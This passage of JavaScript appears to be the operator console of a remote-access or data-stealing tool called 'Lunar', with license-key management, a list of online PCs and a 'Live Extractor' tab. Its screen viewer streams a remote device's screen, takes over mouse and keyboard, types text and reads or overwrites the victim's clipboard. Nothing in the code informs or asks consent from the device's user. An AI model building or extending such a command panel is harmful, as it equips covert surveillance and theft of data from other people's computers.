          const prefixes = ['LUNAR', 'STAR', 'NOVA', 'ORBIT', 'MOON', 'COMET'];
          prefix.value = prefixes[Math.floor(Math.random() * prefixes.length)];
          groups.value = [3,4,5][Math.floor(Math.random() * 3)];
          length.value = [4,5,6,8][Math.floor(Math.random() * 4)];
          keyInput.value = generateLicenseKey(prefix.value, groups.value, length.value);
        }}, 'RANDOM')
      );
      body.appendChild(genRow);
    }

    // Expiry
    const expiresInput = el('input', { type: 'text', class: 'l-input', placeholder: 'YYYY-MM-DD HH:MM' });
    if (isEdit && item.expires_at) {
      const d = new Date(item.expires_at);
      const pad = n => String(n).padStart(2, '0');
      expiresInput.value = `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
    }
    body.appendChild(el('div', {},
      el('label', { class: 'text-xs font-bold mb-1', style: { display: 'block', color: 'var(--l-text-muted)' } }, 'EXPIRY DATE & TIME (local time)'),
      expiresInput,
      el('div', { class: 'flex gap-1 flex-wrap mt-2' },
        ...[['+1h', 1], ['+6h', 6], ['+1d', 24], ['+7d', 168], ['+30d', 720], ['+1y', 8760]].map(([label, hours]) =>
          el('button', {
            class: 'l-btn l-btn-xs',
            style: { background: '#334155' },
            onclick: () => {
              const target = new Date(Date.now() + hours * 3600 * 1000);
              const pad = n => String(n).padStart(2, '0');
              expiresInput.value = `${target.getFullYear()}-${pad(target.getMonth()+1)}-${pad(target.getDate())} ${pad(target.getHours())}:${pad(target.getMinutes())}`;
            }
          }, label)
        )
      ),
      el('div', { class: 'text-xs mt-1', style: { color: 'var(--l-text-muted)' } }, 'Format: YYYY-MM-DD HH:MM')
    ));

    // Notes
    const notesInput = el('textarea', { class: 'l-input', rows: 3 });
    if (isEdit && item.notes) notesInput.value = item.notes;
    body.appendChild(el('div', {},
      el('label', { class: 'text-xs font-bold mb-1', style: { display: 'block', color: 'var(--l-text-muted)' } }, 'NOTES / DESCRIPTION'),
      notesInput
    ));

    // Active toggle
    const activeCheck = el('input', { type: 'checkbox' });
    activeCheck.checked = isEdit ? !!item.is_active : true;
    body.appendChild(el('label', { class: 'check-row', style: { color: 'var(--l-online)' } },
      activeCheck, 'License is ACTIVE'));

    const footer = el('div', { class: 'flex gap-2 justify-between w-full' },
      el('button', { class: 'l-btn l-btn-sm', style: { background: '#334155' }, onclick: () => modal.close() }, 'CANCEL'),
      el('button', { class: 'l-btn l-btn-sm', style: { background: 'var(--l-accent-green)' }, onclick: () => {
        const key = keyInput.value.trim();
        if (!key) { toast('License key cannot be empty', 'error'); return; }
        let expiresAt;
        try { expiresAt = parseUserDateTime(expiresInput.value); }
        catch (e) { toast(e.message, 'error'); return; }
        const result = {
          license_key: key,
          expires_at: expiresAt,
          notes: notesInput.value.trim(),
          is_active: activeCheck.checked,
        };
        modal.close();
        self.onResult(result);
      }}, isEdit ? 'SAVE CHANGES' : 'CREATE LICENSE')
    );

    const modal = showModal({
      title: isEdit ? 'Edit License' : 'Create License',
      body,
      footer,
      dark: true,
    });
  }
}

/* ============================================================
   SCREEN VIEWER
   ============================================================ */
class ScreenViewer {
  constructor(deviceId, computerName, admin) {
    this.deviceId = deviceId;
    this.computerName = computerName;
    this.admin = admin;
    this.closing = false;
    this.lastFrameId = -1;
    this.controlEnabled = false;
    this.lastClipboardId = 0;
    this.refreshTimer = null;
    this.clipboardTimer = null;
    this.currentImageUrl = null;
    this._build();
    this._startRefresh();
  }

  _build() {
    const self = this;
    const container = $('#screenViewerContainer');
    const viewer = el('div', { class: 'screen-viewer' });

    // Header
    const header = el('div', { class: 'screen-viewer-header' });
    header.appendChild(el('span', { style: { fontWeight: '700', fontSize: '14px' } }, '🖥 ' + (this.computerName || 'Unknown')));
    this.statusLabel = el('span', { class: 'text-xs', style: { color: 'var(--l-text-muted)' } }, 'Waiting for first frame...');
    header.appendChild(this.statusLabel);
    header.appendChild(el('button', {
      class: 'l-btn l-btn-xs',
      style: { marginLeft: 'auto', background: 'var(--l-accent-red)' },
      onclick: () => self.close(),
    }, 'STOP & CLOSE'));
    viewer.appendChild(header);

    // Toolbar
    const toolbar = el('div', { class: 'screen-viewer-toolbar' });
    this.controlBtn = el('button', {
      class: 'l-btn l-btn-sm',
      style: { background: 'var(--l-accent-purple)' },
      onclick: () => self.toggleControl(),
    }, '🎮 ENABLE REMOTE CONTROL');
    toolbar.appendChild(this.controlBtn);

    toolbar.appendChild(el('button', {
      class: 'l-btn l-btn-sm',
      style: { background: 'var(--l-accent-cyan)' },
      onclick: () => self.sendClipboardToUser(),
    }, '📋 SEND CLIPBOARD'));

    toolbar.appendChild(el('button', {
      class: 'l-btn l-btn-sm',
      style: { background: '#334155' },
      onclick: () => self.getClipboardFromUser(),
    }, '📥 GET CLIPBOARD'));

    toolbar.appendChild(el('button', {
      class: 'l-btn l-btn-sm',
      style: { background: '#334155' },
      onclick: () => self.sendTextDialog(),
    }, '⌨ SEND TEXT'));

    this.controlStatus = el('span', { class: 'text-xs', style: { marginLeft: 'auto', color: 'var(--l-text-muted)' } }, 'VIEW ONLY');
    toolbar.appendChild(this.controlStatus);
    viewer.appendChild(toolbar);

    // Image
    const imageArea = el('div', { class: 'screen-viewer-image' });
    this.placeholder = el('div', { class: 'placeholder' }, 'Waiting for screen...');
    this.imageEl = el('img', { style: { display: 'none' } });
    imageArea.appendChild(this.placeholder);
    imageArea.appendChild(this.imageEl);
    viewer.appendChild(imageArea);

    // Bind input events
    this._bindInputEvents(imageArea);

    // Footer
    const footer = el('div', { class: 'screen-viewer-footer' });
    footer.appendChild(el('span', {}, 'Device: ' + this.deviceId));
    this.clipStatus = el('span', {}, '');
    footer.appendChild(this.clipStatus);
    viewer.appendChild(footer);

    container.appendChild(viewer);
    this.viewer = viewer;
  }

  _bindInputEvents(area) {
    const self = this;
    let lastMoveTime = 0;

    area.addEventListener('mousemove', (e) => {
      if (!self.controlEnabled) return;
      const now = Date.now();
      if (now - lastMoveTime < 50) return;
      lastMoveTime = now;
      const coords = self._toRemoteCoords(e);
      if (coords) self._sendInput(coords.x, coords.y, 'move');
    });

    area.addEventListener('click', (e) => {
      if (!self.controlEnabled) return;
      const coords = self._toRemoteCoords(e);
      if (coords) self._sendInput(coords.x, coords.y, 'click', 'left');
    });

    area.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      if (!self.controlEnabled) return;
      const coords = self._toRemoteCoords(e);
      if (coords) self._sendInput(coords.x, coords.y, 'click', 'right');
    });

    area.addEventListener('dblclick', (e) => {
      if (!self.controlEnabled) return;
      const coords = self._toRemoteCoords(e);
      if (coords) self._sendInput(coords.x, coords.y, 'double', 'left');
    });

    area.addEventListener('wheel', (e) => {
      if (!self.controlEnabled) return;
      e.preventDefault();
      const coords = self._toRemoteCoords(e);
      if (coords) self._sendInput(coords.x, coords.y, 'scroll', '', Math.sign(e.deltaY));
    }, { passive: false });

    // Keyboard
    document.addEventListener('keydown', (e) => {
      if (!self.controlEnabled || self.closing) return;
      const tag = (e.target.tagName || '').toLowerCase();
      if (tag === 'input' || tag === 'textarea') return;
      self._handleKey(e);
    });
  }

  _handleKey(e) {
    const mods = [];
    if (e.ctrlKey) mods.push('ctrl');
    if (e.shiftKey) mods.push('shift');
    if (e.altKey) mods.push('alt');
    const key = e.key;

    // Modifier-only
    if (['Control', 'Shift', 'Alt', 'Meta'].includes(key)) return;

    // Hotkey combo
    if (mods.length) {
      e.preventDefault();
      const hotkey = mods.concat([key.toLowerCase()]).join('+');
      this._sendInput(0, 0, 'hotkey', '', 0, '', hotkey);
      return;
    }

    // Printable char
    if (key.length === 1 && key.charCodeAt(0) >= 32) {
      e.preventDefault();
      this._sendInput(0, 0, 'key', '', 0, key);
      return;
    }

    // Special keys
    const special = {
      'Enter': 'enter', 'Tab': 'tab', 'Backspace': 'backspace',
      'Delete': 'delete', 'Escape': 'esc', 'ArrowUp': 'up',
      'ArrowDown': 'down', 'ArrowLeft': 'left', 'ArrowRight': 'right',
      'Home': 'home', 'End': 'end', 'PageUp': 'pageup', 'PageDown': 'pagedown',
    };
    if (special[key]) {
      e.preventDefault();
      this._sendInput(0, 0, 'hotkey', '', 0, '', special[key]);
    }
  }

  _toRemoteCoords(e) {
    const img = this.imageEl;
    if (!img || img.style.display === 'none') return null;
    const rect = img.getBoundingClientRect();
    if (e.clientX < rect.left || e.clientX > rect.right ||
        e.clientY < rect.top || e.clientY > rect.bottom) return null;
    const relX = e.clientX - rect.left;
    const relY = e.clientY - rect.top;
    const remoteW = img.naturalWidth || 1920;
    const remoteH = img.naturalHeight || 1080;
    const x = Math.round(relX * remoteW / rect.width);
    const y = Math.round(relY * remoteH / rect.height);
    return { x: Math.max(0, Math.min(x, remoteW - 1)), y: Math.max(0, Math.min(y, remoteH - 1)) };
  }

  async _sendInput(mouseX, mouseY, action, button, scroll, keyText, hotkey) {
    try {
      await this.admin.supabase.rpc('lunar_send_input', {
        p_device_id: this.deviceId,
        p_mouse_x: mouseX || 0,
        p_mouse_y: mouseY || 0,
        p_mouse_action: action || '',
        p_mouse_button: button || '',
        p_scroll_delta: scroll || 0,
        p_key_text: keyText || '',
        p_hotkey_text: hotkey || '',
      });
    } catch (e) { console.error('[SEND INPUT ERROR]', e); }
  }

  _startRefresh() {
    const loop = async () => {
      if (this.closing) return;
      await this._downloadFrame();
      this.refreshTimer = setTimeout(loop, 900);
    };
    this.refreshTimer = setTimeout(loop, 100);
    this.clipboardTimer = setInterval(() => this._pollClipboard(), 1500);
  }

  async _downloadFrame() {
    try {
      const { data } = await this.admin.supabase.from('lunar_devices')
        .select('screen_storage_path, screen_frame_id, screen_view_active, screen_last_upload')
        .eq('device_id', this.deviceId);
      if (!data || !data.length) return;
      const row = data[0];
      const active = row.screen_view_active;
      const path = String(row.screen_storage_path || '').trim();
      const frameId = row.screen_frame_id || 0;

      if (!active) { this._setStatus('Stream stopped by server', 'var(--l-offline)'); return; }
      if (!path) { this._setStatus('Waiting for first frame...', 'var(--l-text-muted)'); return; }
      if (frameId === this.lastFrameId) return;

      const url = `${CONFIG.LUNAR_SUPABASE_URL}/storage/v1/object/public/${CONFIG.LUNAR_SCREEN_BUCKET}/${path}?t=${Date.now()}`;
      this.lastFrameId = frameId;
      this.currentImageUrl = url;

      const img = new Image();
      img.crossOrigin = 'anonymous';
      img.onload = () => {
        if (this.closing) return;
        this.imageEl.src = url;
        this.imageEl.style.display = 'block';
        this.placeholder.style.display = 'none';
        this._setStatus('● LIVE • ' + formatTime(row.screen_last_upload), 'var(--l-online)');
      };
      img.onerror = () => { this._setStatus('Failed to load frame', 'var(--l-offline)'); };
      img.src = url;
    } catch (e) {
      this._setStatus('Error: ' + (e.message || e).slice(0, 60), 'var(--l-offline)');
    }
  }

  _setStatus(text, color) {
    if (this.statusLabel) {
      this.statusLabel.textContent = text;
      this.statusLabel.style.color = color || 'var(--l-text-muted)';
    }
  }

  toggleControl() {
    this.controlEnabled = !this.controlEnabled;
    const enabled = this.controlEnabled;
    this.controlBtn.textContent = enabled ? '🛑 DISABLE REMOTE CONTROL' : '🎮 ENABLE REMOTE CONTROL';
    this.controlBtn.style.background = enabled ? 'var(--l-accent-red)' : 'var(--l-accent-purple)';
    this.controlStatus.textContent = enabled ? '🎮 CONTROL ACTIVE' : 'VIEW ONLY';
    this.controlStatus.style.color = enabled ? 'var(--l-accent-purple)' : 'var(--l-text-muted)';
    this.admin.supabase.rpc('lunar_set_control', { p_device_id: this.deviceId, p_enabled: enabled })
      .catch(e => console.error('[CONTROL TOGGLE ERROR]', e));
  }

  sendTextDialog() {
    if (!this.controlEnabled) { toast('Enable remote control first', 'warning'); return; }
    promptDialog('Send Text', 'Text to type on the remote screen:', '', (text) => {
      if (text) this._sendInput(0, 0, 'text', '', 0, text);
    }, { dark: true });
  }

  async sendClipboardToUser() {
    if (!this.controlEnabled) { toast('Enable remote control first', 'warning'); return; }
    let text = '';
    try { text = await navigator.clipboard.readText(); } catch (e) {}
    if (!text) {
      promptDialog('Send Clipboard', 'Text to set on the user\'s clipboard:', '', async (val) => {
        if (val) {
          try {
            await this.admin.supabase.rpc('lunar_send_clipboard', {
              p_device_id: this.deviceId, p_text: val, p_direction: 'to_user',
            });
            this._setClipStatus('📋 Sent to user');
          } catch (e) { this._setClipStatus('Error: ' + (e.message || e).slice(0, 40)); }
        }
      }, { dark: true });
      return;
    }
    try {
      await this.admin.supabase.rpc('lunar_send_clipboard', {
        p_device_id: this.deviceId, p_text: text, p_direction: 'to_user',
      });
      this._setClipStatus('📋 Sent to user');
    } catch (e) { this._setClipStatus('Error: ' + (e.message || e).slice(0, 40)); }
  }

  async getClipboardFromUser() {
    if (!this.controlEnabled) { toast('Enable remote control first', 'warning'); return; }
    try {
      await this.admin.supabase.rpc('lunar_send_clipboard', {
        p_device_id: this.deviceId, p_text: '', p_direction: 'request_from_user',
      });
      this._setClipStatus('📥 Requested from user...');
    } catch (e) { this._setClipStatus('Error: ' + (e.message || e).slice(0, 40)); }
  }

  async _pollClipboard() {
    if (this.closing) return;
    try {
      const { data } = await this.admin.supabase.from('lunar_devices')
        .select('clipboard_text, clipboard_direction, clipboard_id')
        .eq('device_id', this.deviceId);
      if (!data || !data.length) return;
      const row = data[0];
      const clipId = row.clipboard_id || 0;
      const direction = String(row.clipboard_direction || '');
      const text = row.clipboard_text || '';
      if (clipId !== this.lastClipboardId && direction === 'to_admin') {
        this.lastClipboardId = clipId;
        try {
          await navigator.clipboard.writeText(text);
          this._setClipStatus('📥 Received (' + text.length + ' chars)');
        } catch (e) {
          this._setClipStatus('📥 Received (copy failed)');
        }
      }
    } catch (e) {}
  }

  _setClipStatus(text) {
    if (this.clipStatus) {
      this.clipStatus.textContent = text;
      setTimeout(() => { if (this.clipStatus && !this.closing) this.clipStatus.textContent = ''; }, 4000);
    }
  }

  show() {
    if (this.viewer) this.viewer.style.display = 'flex';
  }

  close() {
    if (this.closing) return;
    this.closing = true;
    if (this.refreshTimer) clearTimeout(this.refreshTimer);
    if (this.clipboardTimer) clearInterval(this.clipboardTimer);
    this.admin.supabase.rpc('lunar_set_control', { p_device_id: this.deviceId, p_enabled: false }).catch(() => {});
    this.admin.supabase.rpc('lunar_set_screen_view', { p_device_id: this.deviceId, p_active: false }).catch(() => {});
    if (this.viewer) this.viewer.remove();
  }
}

/* ============================================================
   APP
   ============================================================ */
class App {
  constructor() {
    this.projects = loadProjects();
    this.projectTabs = {};
    this.lunarPanel = null;
    this.mainTabs = [];
    this._build();
  }

  _build() {
    const self = this;
    const tabBar = $('#mainTabBar');
    const tabContent = $('#mainTabContent');

    // Build project tabs
    for (const proj of this.projects) {
      this._addProjectTab(proj);
    }

    // Lunar tab
    const lunarTabBtn = el('button', {
      class: 'tab-btn',
      onclick: () => self.openLunar(),
    }, '🌙 LUNAR PANEL');
    tabBar.appendChild(lunarTabBtn);
    this.lunarTabBtn = lunarTabBtn;

    // Add DB tab
    const addTabBtn = el('button', {
      class: 'tab-btn',
      onclick: () => self.openAddDB(),
    }, '＋ ADD DB');
    tabBar.appendChild(addTabBtn);
    this.addTabBtn = addTabBtn;

    // Add DB content
    const addContent = $('#addDbTabContent');
    this.addTab = new AddProjectTab(addContent, this);

    // Activate first project tab
    if (this.mainTabs.length) {
      this._activateTab(this.mainTabs[0]);
    }
  }

  _addProjectTab(project) {
    const self = this;
    const tabBar = $('#mainTabBar');
    const tabContent = $('#mainTabContent');
    const title = project.name || project.project_id || 'Project';

    // Button (insert before lunar/add)
    const btn = el('button', { class: 'tab-btn' }, title);
    tabBar.insertBefore(btn, this.lunarTabBtn || null);

    // Content
    const content = el('div', { class: 'tab-content', style: { flexDirection: 'column', height: '100%' } });

    // Inner tabs
    const innerTabBar = el('div', { class: 'tab-bar' });
    const pcBtn = el('button', { class: 'tab-btn active' }, '🖥 Online PCs');
    const leBtn = el('button', { class: 'tab-btn' }, '📊 Live Extractor');
    innerTabBar.appendChild(pcBtn);
    innerTabBar.appendChild(leBtn);
    content.appendChild(innerTabBar);

    const pcContent = el('div', { style: { flex: '1', overflow: 'hidden', display: 'flex', flexDirection: 'column' } });
    const leContent = el('div', { style: { flex: '1', overflow: 'hidden', display: 'none', flexDirection: 'column' } });
    content.appendChild(pcContent);
    content.appendChild(leContent);

    const pcTab = new PCListTab(pcContent, project);
    const leTab = new LiveExtractorTab(leContent, project);

    pcBtn.addEventListener('click', () => {
      pcBtn.classList.add('active'); leBtn.classList.remove('active');
      pcContent.style.display = 'flex'; leContent.style.display = 'none';
    });
    leBtn.addEventListener('click', () => {
      leBtn.classList.add('active'); pcBtn.classList.remove('active');
      leContent.style.display = 'flex'; pcContent.style.display = 'none';
    });

    tabContent.appendChild(content);

    const tabInfo = { btn, content, pcTab, leTab, project };
    this.mainTabs.push(tabInfo);

    btn.addEventListener('click', () => self._activateTab(tabInfo));
    return tabInfo;
  }

  _activateTab(tabInfo) {
    for (const t of this.mainTabs) {
      t.btn.classList.remove('active');
      t.content.style.display = 'none';
    }
    if (this.lunarTabBtn) this.lunarTabBtn.classList.remove('active');
    if (this.addTabBtn) this.addTabBtn.classList.remove('active');
    $('#addDbTabContent').style.display = 'none';
    $('#lunarTabContent').style.display = 'none';

    tabInfo.btn.classList.add('active');
    tabInfo.content.style.display = 'flex';
  }

  openAddDB() {
    for (const t of this.mainTabs) {
      t.btn.classList.remove('active');
      t.content.style.display = 'none';
    }
    if (this.lunarTabBtn) this.lunarTabBtn.classList.remove('active');
    if (this.addTabBtn) this.addTabBtn.classList.add('active');
    $('#addDbTabContent').style.display = 'flex';
    $('#lunarTabContent').style.display = 'none';
    this.addTab.refresh();
  }

  openLunar() {
    for (const t of this.mainTabs) {
      t.btn.classList.remove('active');
      t.content.style.display = 'none';
    }
    if (this.addTabBtn) this.addTabBtn.classList.remove('active');
    if (this.lunarTabBtn) this.lunarTabBtn.classList.add('active');
    $('#addDbTabContent').style.display = 'none';
    const lunarContent = $('#lunarTabContent');
    lunarContent.style.display = 'flex';

    if (!this.lunarPanel) {
      this.lunarPanel = new LunarAdminPanel(lunarContent);
    }
  }

  async saveNewProject() {
    const tab = this.addTab;
    const inputs = tab.inputs;
    let url = inputs.url.value.trim();
    let skey = inputs.skey.value.trim();
    let akey = inputs.akey.value.trim();
    let pid = inputs.pid.value.trim();
    let name = inputs.name.value.trim();

    if (!url) { tab.statusEl.textContent = '❌ URL required'; return; }
    if (!skey && !akey) { tab.statusEl.textContent = '❌ Service key or Anon key required'; return; }
    if (!url.startsWith('http')) url = 'https://' + url;
    url = url.replace(/\/$/, '');
    if (!pid) pid = url.replace('https://', '').split('.')[0];
    if (!name) name = pid;

    const project = {
      name, url,
      service_key: skey || akey,
      anon_key: akey || skey,
      project_id: pid,
    };

    tab.statusEl.textContent = '⏳ Testing…';

    // Test connection
    let ok = true, err = '';
    try {
      const resp = await fetch(`${url}/rest/v1/extractor_sources?select=source_id&limit=1`, {
        headers: { apikey: skey || akey, Authorization: `Bearer ${skey || akey}` },
      });
      if (!resp.ok) { ok = false; err = `HTTP ${resp.status}: ${(await resp.text()).slice(0, 300)}`; }
    } catch (e) { ok = false; err = e.message; }

    if (!ok) {
      if (!confirm(`Connection failed:\n${err}\n\nSave anyway?`)) return;
    }

    this.projects.push(project);
    saveProjects(this.projects);
    tab.refresh();
    this._addProjectTab(project);
    tab.statusEl.textContent = `✅ '${name}' saved.`;
    tab._clear();
    toast('Project added', 'success');
  }

  saveProjects() {
    saveProjects(this.projects);
  }
}

let AppInstance = null;
document.addEventListener('DOMContentLoaded', () => {
  AppInstance = new App();
  // Expose for inline handlers
  window.App = {
    openLunar: () => AppInstance.openLunar(),
    openAddDB: () => AppInstance.openAddDB(),
    saveProjects: () => AppInstance.saveProjects(),
    saveNewProject: () => AppInstance.saveNewProject(),
  };
});

/* ============================================================
   PULL TO REFRESH (simple)
   ============================================================ */
(function() {
  let startY = 0, pulling = false;
  document.addEventListener('touchstart', (e) => {
    if (window.scrollY === 0) { startY = e.touches[0].clientY; pulling = true; }
  }, { passive: true });
  document.addEventListener('touchmove', (e) => {
    if (!pulling) return;
    const dy = e.touches[0].clientY - startY;
    if (dy > 100 && window.scrollY === 0) {
      pulling = false;
      // Trigger refresh on active tab
      if (AppInstance) {
        for (const t of AppInstance.mainTabs) {
          if (t.content.style.display !== 'none') {
            if (t.pcTab) t.pcTab._refreshNow();
            break;
          }
        }
      }
    }
  }, { passive: true });
  document.addEventListener('touchend', () => { pulling = false; }, { passive: true });
})();
</script>
